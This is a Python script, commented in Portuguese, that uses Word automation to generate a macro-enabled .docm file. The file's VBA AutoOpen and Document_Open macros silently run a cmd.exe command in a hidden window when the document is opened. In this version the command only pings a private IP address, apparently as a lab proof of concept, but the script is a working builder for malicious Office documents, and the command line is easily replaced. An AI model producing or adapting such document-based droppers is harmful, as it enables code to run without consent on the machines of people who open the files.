import win32com.client as win32
import os

def criar_docm_simples(ip_address="192.168.29.11"):
    """
    Cria um .docm simples que funciona
    """
    try:
        # Iniciar Word
        word = win32.Dispatch("Word.Application")
        word.Visible = False
        
        # Criar documento
        doc = word.Documents.Add()
        doc.Content.Text = f"Documento com macro - IP: {ip_address}"
        
        # Código VBA simples
        vba_code = f'''Sub AutoOpen()
    Call MyMacro
End Sub

Sub Document_Open()
    Call MyMacro
End Sub

Sub MyMacro()
    Dim cmd As String
    cmd = "cmd.exe /c ping -n 4 {ip_address}"
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub'''
        
        # Adicionar macro
        vba_module = doc.VBProject.VBComponents.Add(1)
        vba_module.CodeModule.AddFromString(vba_code)
        
        # Salvar
        output_path = "documento_simples.docm"
        doc.SaveAs2(os.path.abspath(output_path), FileFormat=13)
        doc.Close()
        word.Quit()
        
        print(f"✅ Criado: {output_path}")
        return True
        
    except Exception as e:
        print(f"❌ Erro: {e}")
        return False

if __name__ == "__main__":
    criar_docm_simples("192.168.29.11")
